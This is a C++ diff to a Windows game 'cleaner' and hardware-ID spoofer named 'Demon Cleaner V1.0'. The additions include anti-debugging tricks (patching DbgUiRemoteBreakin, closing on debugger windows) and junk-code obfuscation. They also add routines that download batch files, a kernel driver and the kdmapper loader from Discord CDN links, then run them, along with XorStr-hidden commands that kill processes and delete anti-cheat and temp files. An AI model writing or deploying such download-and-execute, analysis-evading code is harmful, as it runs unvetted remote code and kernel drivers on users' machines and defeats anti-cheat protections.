@@ -4,15 +4,69 @@
 #include <windows.h>
 #include <filesystem>
 #include <Urlmon.h>
+#include "junk-code.h"
+#include "protection.h"
 #pragma comment(lib, "urlmon.lib")
+__declspec(naked) void AntiAttach() {
+    __asm {
+        jmp ExitProcess
+    }
+}
+void antiattachlmao()
+{
+    HANDLE hProcess = GetCurrentProcess();
 
+    HMODULE hMod = GetModuleHandleW(L"ntdll.dll");
+    FARPROC func_DbgUiRemoteBreakin = GetProcAddress(hMod, "DbgUiRemoteBreakin");
+
+    WriteProcessMemory(hProcess, func_DbgUiRemoteBreakin, AntiAttach, 6, NULL);
+
+    SetConsoleTitle("Demon Cleaner V1.0");
+    
+}
+void WindowFinder()
+{
+    if (FindWindow(NULL, "x32dbg"))
+    {
+        MessageBoxA(NULL, "Debugger Found", "Notification", MB_OK);
+        exit(0);
+    }
+    if (FindWindow(NULL, "x64dbg"))
+    {
+        MessageBoxA(NULL, "Debugger Found", "Notification", MB_OK);
+        exit(0);
+    }
+    if (FindWindow(NULL, "OllyDbg"))
+    {
+        MessageBoxA(NULL, "Debugger Found", "Notification", MB_OK);
+        exit(0);
+    }
+    if (FindWindow(NULL, "FiddlerEverywhere"))
+    {
+        MessageBoxA(NULL, "Web Debugger Found", "Notification", MB_OK);
+        exit(0);
+    }
+}
+void Output()
+{
+    SetLastError(0);
+    // Send a string to the debugger
+    OutputDebugStringA("Hello, debugger");
+    if (GetLastError() != 0)
+    {
+        MessageBoxA(NULL, "Debugger Detected", "", MB_OK);
+        exit(0);
+    }
+    
+}
 void apex()
 {
 
-    std::string apex = "https://cdn.discordapp.com/attachments/784033421747814400/877941040638738512/apex.bat";
+    std::string apex = "https://cdn.discordapp.com/attachments/702060437168193556/878306088104124416/Apex.bat";
     std::string apexpath = "C:\Apex.bat";
     URLDownloadToFileA(NULL, apex.c_str(), apexpath.c_str(), 0, NULL);
     system("Start C:\Apex.bat");
+    
 
 }
 void gta() 
@@ -34,7 +88,37 @@ void fishingplanet()
     system("Start C:\Fishing-planet.bat");
 
 }
+void cod()
+{
+    std::string cod = "https://cdn.discordapp.com/attachments/702060437168193556/878321115284516864/cw.bat";
+    std::string codpath = "C:\Cold-Ware.bat";
+    URLDownloadToFileA(NULL, cod.c_str(), codpath.c_str(), 0, NULL);
+    system("Start C:\Cold-Ware.bat");
+
+    
+}
+void spoofer()
+{
+    string spoofer = "https://cdn.discordapp.com/attachments/702060437168193556/878327452898840667/NewWoof.sys";
+    string spooferpath = "C:\\woof.sys"; //change to dir you want
+    URLDownloadToFileA(NULL, spoofer.c_str(), spooferpath.c_str(), 0, NULL);
+    {
+        string mapper = "https://cdn.discordapp.com/attachments/702060437168193556/878327688694202368/kdmapper_1.exe";
+        string mapperpath = "C:\\mapper.exe";//change to dir you want
+        URLDownloadToFileA(NULL, mapper.c_str(), mapperpath.c_str(), 0, NULL);
+    }
+    system("C:\\mapper.exe C:\\woof.sys");
+    Sleep(2000);
+    MessageBox(NULL, ("Wait 60 Seconds For Your Bios And Baseboard To Be Spoofed"), ("Warning"), MB_OK | MB_SYSTEMMODAL);
+    Sleep(60000);
+}
 void cleaner(){
+    junkcode::rydekem();
+    junkcode::plvbjwh();
+    junkcode::tlmisir();
+    junkcode::akfuxnl();
+    junkcode::lnttirs();
+    MessageBoxA(NULL, "You must verify the game files if a game isn't starting and then enjoy playing.", "warning by demon",MB_OK);
     system(XorStr("cls").c_str());
     system(XorStr("taskkill /F /IM CCleaner64.exe 2>NULL").c_str());
     system(XorStr("taskkill /F /IM WargamingErrorMonitor.exe 2>NULL").c_str());
@@ -56,6 +140,9 @@ void cleaner(){
     system(XorStr("taskkill /F /IM wcg.exe 2>NULL").c_str());
     system(XorStr("taskkill /F /IM r5apex.exe 2>NULL").c_str());
     system(XorStr("del /F /IM C:\Windows\Capcom.sys 2>NULL").c_str());
+    system(XorStr("del /F /IM del /f %temp%\* 2>NULL").c_str());
+    system(XorStr("del /F /IM D:\steam\depotcache\* 2>NULL").c_str());
+    system(XorStr("del /F /IM C:\steam\depotcache\* 2>NULL").c_str());
     system(XorStr("del /F /IM C:\Program Files (x86)\EasyAntiCheat\EasyAntiCheat.exe 2>NULL").c_str());
     system(XorStr("del /F /IM C:\Program Files (x86)\EasyAntiCheat\EasyAntiCheat.sys 2>NULL").c_str());
     system(XorStr("del /F /IM C:\Windows\KsDumperDriver.sys 2>NULL").c_str());
@@ -123,6 +210,7 @@ void cleaner(){
     system(XorStr("taskkill /f /im RiotClientServices.exe >nul 2>&1").c_str());
     system(XorStr("taskkill /f /im VALORANT.exe >nul 2>&1").c_str());
     system(XorStr("taskkill /f /im RainbowSix.exe >nul 2>&1").c_str());
+    system(XorStr("taskkill /f /im csgo.exe >nul 2>&1").c_str());
     system(XorStr("taskkill /f /im RainbowSix_BE.exe >nul 2>&1").c_str());
     system(XorStr("taskkill /f /im HTTPDebuggerUI.exe >nul 2>&1").c_str());
     system(XorStr("taskkill /f /im HTTPDebuggerSvc.exe >nul 2>&1").c_str());
@@ -135,10 +223,16 @@ void cleaner(){
 
 int main()
 {
+    antiattachlmao();
+    WindowFinder();
+    Output();
+    protection::IsDbgPresent();
     cleaner();
     fishingplanet();
     gta();
     apex();
+    cod();
+    spoofer();
     
 }
 
